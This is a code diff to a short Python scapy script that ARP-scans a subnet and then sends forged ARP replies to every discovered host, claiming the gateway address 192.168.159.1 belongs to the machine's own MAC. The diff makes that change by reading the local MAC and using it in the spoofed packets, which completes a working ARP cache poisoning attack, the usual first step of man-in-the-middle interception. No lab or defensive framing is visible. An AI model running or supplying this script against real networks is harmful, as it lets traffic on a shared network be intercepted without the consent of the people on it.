@@ -1,6 +1,8 @@
 from scapy.all import *
 import sys
-
+from uuid import getnode as get_mac
+mac = get_mac()
+mac = ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
 
 def scan(ip):
     arp_request = ARP(pdst=ip)
@@ -14,7 +16,7 @@ def scan(ip):
         client_list.append(client_dict)
     return client_list
 
-def spoof(ip,mac):
+def spoof(ip):
     arp = ARP(op=2, psrc="192.168.159.1", pdst=ip, hwsrc=mac)
     pkt = send(arp)
     x = sniff(filter="arp", count=5, timeout=2)
@@ -25,7 +27,7 @@ def print_result(results_list):
     print("IP\t\t\tMAC Address\n-----------------------------------------")
     for client in results_list:
         print(client["ip"] + "\t\t" + client["mac"])
-        spoof(client["ip"],client["mac"])
+        spoof(client["ip"])
 
 
 
